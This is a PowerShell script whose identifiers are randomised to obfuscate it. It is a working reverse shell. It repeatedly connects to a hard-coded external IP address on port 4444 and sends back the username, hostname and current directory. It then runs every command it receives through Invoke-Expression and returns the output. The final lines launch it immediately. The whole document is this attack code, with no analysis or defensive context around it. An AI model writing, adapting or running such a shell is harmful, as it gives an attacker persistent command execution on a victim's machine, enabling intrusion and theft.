class HMoPdjj {
    
    [string]$wOnKRGuUCJrChTGnCuGmM = "93.49.240.195"
    [int]$AtsvZYWBWiwakydTofA = 4444

    $BDLrz
    $YgDaQvbfKnrNjMhFv
    $RHSSTz
    $FFKmaLfEEuSc
    $fYogPiEFi
    $cxWSUFiuGlLfVchDnEAQBa
    [int]$tiwEmyZdqowWPFXAZa = 50*1024

    aFWjJyZDtllLuf() {
        $this.YgDaQvbfKnrNjMhFv = $false
        while ($true) {
            try {
                $this.YgDaQvbfKnrNjMhFv = New-Object Net.Sockets.TcpClient($this.wOnKRGuUCJrChTGnCuGmM, $this.AtsvZYWBWiwakydTofA)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.IqcztKkZnbDkIrXENKHh()
    }

    IqcztKkZnbDkIrXENKHh() {
        $this.BDLrz = $this.YgDaQvbfKnrNjMhFv.GetStream()
        $this.FFKmaLfEEuSc = New-Object Byte[] $this.tiwEmyZdqowWPFXAZa
        $this.cxWSUFiuGlLfVchDnEAQBa = New-Object Text.UTF8Encoding
        $this.RHSSTz = New-Object IO.StreamWriter($this.BDLrz, [Text.Encoding]::UTF8, $this.tiwEmyZdqowWPFXAZa)
        $this.fYogPiEFi = New-Object System.IO.StreamReader($this.BDLrz)
        $this.RHSSTz.AutoFlush = $true
    }

    FVZYvCAkeAymwuwxeNeqr() {
        $this.aFWjJyZDtllLuf()
        $this.XopTnr()
    }

    GeloPoGphleZavayRqS($TEcjopbiVmg) {
        try {
            [byte[]]$vNQYkbQWOCsyknNbfS = [text.Encoding]::Ascii.GetBytes($TEcjopbiVmg)
            $this.RHSSTz.Write($vNQYkbQWOCsyknNbfS, 0, $vNQYkbQWOCsyknNbfS.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.FVZYvCAkeAymwuwxeNeqr()
        }
    }

    [string] ENmmDjBEKbrTXyOYRauV() {
        try {
            $XHuQGtB = $this.BDLrz.Read($this.FFKmaLfEEuSc, 0, $this.tiwEmyZdqowWPFXAZa)    
            $kuNmUIJsoewmA = ($this.cxWSUFiuGlLfVchDnEAQBa.GetString($this.FFKmaLfEEuSc, 0, $XHuQGtB))
            return $kuNmUIJsoewmA
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.FVZYvCAkeAymwuwxeNeqr()
            return ""
        }
    }

    [string] SeXNldyXZYlpvpDpfKecOmlc($FgGuZHbtUCjIYAQ) {
        Write-Host $FgGuZHbtUCjIYAQ
        try { 
            $mEigIidWUiWGRzV = Invoke-Expression $FgGuZHbtUCjIYAQ | Out-String
        }
        catch {
            $zuVqVriGHtrg = $_.Exception
            $SiLCXBiAWIKAgtXJvnT = $_.Message
            $mEigIidWUiWGRzV = "`n$_`n"
        }
        return $mEigIidWUiWGRzV
    }

    [string] moTmaUdQkdQltI() {
        $HURGyj = [Environment]::UserName
        $NVYnjxkxVNGIIiB = [System.Net.Dns]::GetHostName()
        $aqDFwqiYdd = Get-Location
        return "$HURGyj@$NVYnjxkxVNGIIiB [$aqDFwqiYdd]~$ "
    }

    XopTnr() {
        while ($this.YgDaQvbfKnrNjMhFv.Connected) {
            $this.GeloPoGphleZavayRqS($this.moTmaUdQkdQltI())         
            $kuNmUIJsoewmA = $this.ENmmDjBEKbrTXyOYRauV()
            $mEigIidWUiWGRzV = "`n"
            if ([string]::IsNullOrEmpty($kuNmUIJsoewmA)) {
                continue
            }
            $mEigIidWUiWGRzV = $this.SeXNldyXZYlpvpDpfKecOmlc($kuNmUIJsoewmA)
            $this.GeloPoGphleZavayRqS($mEigIidWUiWGRzV + "`n")
            $this.BDLrz.Flush()
        }
        $this.YgDaQvbfKnrNjMhFv.Close()
        $this.FVZYvCAkeAymwuwxeNeqr()
    } 
}

$RXHWIQhmhGNFyqsQrxi = [HMoPdjj]::new()
$RXHWIQhmhGNFyqsQrxi.FVZYvCAkeAymwuwxeNeqr()
